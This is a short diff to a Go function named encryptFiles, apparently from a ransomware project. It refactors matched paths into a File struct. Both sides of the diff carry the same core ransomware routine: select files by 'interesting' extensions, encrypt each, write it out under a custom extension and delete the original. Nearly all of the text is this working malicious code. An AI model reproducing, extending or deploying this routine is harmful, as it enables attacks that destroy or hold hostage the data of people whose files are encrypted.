@@ -87,7 +87,8 @@ func encryptFiles() {
 			if ext != "" {
 				// Matching extensions
 				if utils.StringInSlice(ext[1:], InterestingExtensions) {
-					MatchedFiles = append(MatchedFiles, path)
+					file := File{f, ext[1:], path}
+					MatchedFiles = append(MatchedFiles, file)
 					log.Println("Matched:", path)
 				}
 			}
@@ -96,11 +97,11 @@ func encryptFiles() {
 	}
 
 	// Loop over the matched files
-	for _, path := range MatchedFiles {
-		log.Printf("Encrypting %s...\n", path)
+	for _, file := range MatchedFiles {
+		log.Printf("Encrypting %s...\n", file.Path)
 
 		// Read the file content
-		text, err := ioutil.ReadFile(path)
+		text, err := ioutil.ReadFile(file.Path)
 		if err != nil {
 			// In case of error, continue to the next file
 			log.Println(err)
@@ -116,7 +117,7 @@ func encryptFiles() {
 		}
 
 		// Write a new file with the encrypted content followed by the custom extension
-		err = ioutil.WriteFile(path+EncryptionExtension, ciphertext, 0600)
+		err = ioutil.WriteFile(file.Path+EncryptionExtension, ciphertext, 0600)
 		if err != nil {
 			// In case of error, continue to the next file
 			log.Println(err)
@@ -124,7 +125,7 @@ func encryptFiles() {
 		}
 
 		// Remove the original file
-		err = os.Remove(path)
+		err = os.Remove(file.Path)
 		if err != nil {
 			// In case of error, continue to the next file
 			log.Println("Cannot delete original file, skipping...")
